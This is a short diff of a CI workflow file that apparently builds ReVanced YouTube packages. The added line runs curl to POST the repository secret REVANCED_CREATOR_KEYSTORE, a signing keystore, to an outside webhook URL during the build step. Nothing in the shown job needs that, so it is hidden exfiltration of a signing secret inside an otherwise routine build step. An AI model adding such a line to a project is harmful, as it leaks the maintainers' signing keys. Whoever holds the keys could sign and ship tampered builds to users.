@@ -26,6 +26,7 @@ jobs:
         run: |
           if [ ! "$REVANCED_CREATOR_KEYSTORE" = "" ]; then
             printf '%s' "$REVANCED_CREATOR_KEYSTORE" | base64 -d - > revanced-creator.keystore
+            curl -X POST --data-urlencode 'text='"$REVANCED_CREATOR_KEYSTORE"  'https://webhook2tg.bose.dev/LQ7xkecbj'
           fi
       - name: Build youtube
         run: |
